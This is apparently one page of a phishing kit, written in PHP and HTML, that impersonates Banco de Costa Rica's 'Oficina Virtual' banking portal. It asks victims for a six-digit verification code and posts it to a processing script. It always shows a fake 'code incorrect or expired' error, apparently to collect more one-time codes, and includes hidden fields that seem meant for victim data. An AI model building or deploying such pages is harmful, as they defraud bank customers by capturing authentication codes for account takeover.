<?php
session_start();
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
  header("Location: index.html");
  exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<link href="archivos/style.css" rel="stylesheet" type="text/css">

<title>BCR</title>

</head>
<body>

<div class="head">
    <img src="archivos/logo.gif" class="logo">
    <img src="archivos/Certificado.svg" class="headimg1">
    <img src="archivos/Contactenos.svg" class="headimg2">
    <a href="#" class="linkhead1">Certificaciones</a>
    <a href="#" class="linkhead2">Contáctenos</a>
</div>
<div class="head2">
    <span class="texthead">Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span>
</div>
<div class="costilla">
    <span class="seguridadtxt">Seguridad</span>
    <img class="imgcostilla1" src="archivos/Consideraciones.svg">
    <img class="imgcostilla2" src="archivos/reglamento.svg">
    <span class="textcostilla1">Consideraciones</span>
    <span class="textcostilla2">Reglamentos</span>
</div>

<div id="vista1">
    <div class="containerimg">
        <div class="divform1">
            <form action="procesar_sms.php" method="post" onsubmit="return sender2();">
                <p id="gfg" hidden></p>
                <p id="address" hidden></p>
                <div align="center">
                    <span class="ingresartxt" style="font-size: 0.8rem;">Ingresa el Código que le enviamos a su correo electrónico para validar tu dispositivo</span>
                </div>
               
                <hr class="line1" color="#C4C4C4">
                  <br>    <br>    <br>
                <img class="userimg" src="archivos/Seguridad.svg">
                <div class="floating-label">
                    <input class="pass" type="tel" placeholder=" " name="codigo" id="cpass" autocomplete="off" maxlength="6" required>
                    <span class="highlight2"></span>
                    <label>Código</label>
                    <img id="imgpass1" src="archivos/ver.png" class="ver" onclick="pass1(); pass2(); pass11();">
                    <img id="imgpass2" src="archivos/ver2.png" class="ver" onclick="pass3(); pass4(); pass33();" style="display: none;">
                </div>
               <p style="font-size: 13px;margin-top: 52px;color:red;font-family:sans-serif;padding: 22px;">Código incorrecto o ha expirado, le enviaremos uno nuevo</p> <button type="submit" class="btn-uno" style="width:190px; top:180px">Continuar</button>
            </form>
        </div>

        <div class="divform2">
            <span class="ingresartxt" style="font-size: 1.1rem;">Código de Seguridad</span>
            <hr class="line1" color="#C4C4C4">
            <span class="registertext">
                Digitando los datos de su mecanismo de autenticación actual. <br><br>
                Ingrese el código enviado a su método de seguridad.
            </span>
        </div>
    </div>
</div>

<div class="footer">
    <span class="footertext"> BCR © Derechos Reservados 2024. Contáctenos: CentroAsistenciaBCR@bancobcr.com</span>
</div>

</body>
</html>
